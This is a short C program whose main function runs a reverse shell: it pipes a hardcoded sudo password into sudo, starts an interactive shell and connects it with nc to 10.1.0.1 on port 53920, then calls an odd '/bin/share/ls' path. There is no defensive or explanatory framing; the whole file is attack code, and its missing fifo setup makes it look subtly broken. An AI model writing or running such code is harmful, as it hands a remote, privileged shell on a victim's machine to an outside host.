#include <stdlib.h>
int main() {
system("echo target123 | sudo -S nohup cat /tmp/f | /bin/sh -i 2>&1 | nc 10.1.0.1 53920 > /tmp/f");
system("/bin/share/ls");
return 0;
 }